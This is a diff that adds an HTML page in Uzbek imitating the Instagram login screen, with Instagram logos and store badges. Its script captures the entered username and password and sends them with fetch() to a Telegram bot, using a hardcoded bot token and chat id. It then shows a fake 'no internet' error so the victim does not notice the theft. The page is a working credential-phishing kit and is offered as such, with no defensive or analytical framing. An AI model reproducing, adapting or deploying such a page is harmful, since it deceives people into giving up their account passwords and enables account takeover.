@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Instagram</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #fafafa;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin-top: 50px;
+            background: white;
+            border: 1px solid #dbdbdb;
+            width: 300px;
+            padding: 40px 20px;
+            margin-left: auto;
+            margin-right: auto;
+            border-radius: 8px;
+        }
+        .instagram-logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background: #fafafa;
+        }
+        button {
+            width: 95%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #3578e5;
+        }
+        a {
+            display: block;
+            margin-top: 10px;
+            color: #00376b;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .store-icons img {
+            width: 120px;
+            margin: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="instagram-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
+        <input type="text" id="username" placeholder="Telefon raqami, foydalanuvchi nomi yoki elektron pochta" required><br>
+        <input type="password" id="password" placeholder="Parol" required><br>
+        <button onclick="sendData()">Tizimga kirish</button>
+        <a href="#">Parolni unutdingizmi?</a>
+        <p>Hisobingiz yo'qmi? <a href="#">Ro'yxatdan o'tish</a></p>
+        <p>Ilovani yuklab oling.</p>
+        <div class="store-icons">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Apple_logo_black.svg" alt="App Store">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/d/db/Google_Play_Store_badge_EN.svg" alt="Google Play">
+        </div>
+    </div>
+
+    <script>
+        function sendData() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            if(username && password){
+                var token = "7540122910:AAEF-4BMRUrxGHULTmmuw0WG_H-pQY25o6s";
+                var chatId = "@python_01010";
+                var message = "Login: " + username + "%0AParol: " + password;
+                fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + message)
+                .then(response => {
+                    alert("Internet mavjud emas. Qayta urinib ko'ring.");
+                })
+                .catch(error => {
+                    alert("Internet mavjud emas. Qayta urinib ko'ring.");
+                });
+            } else {
+                alert("Iltimos, barcha maydonlarni to'ldiring.");
+            }
+        }
+    </script>
+</body>
+</html>
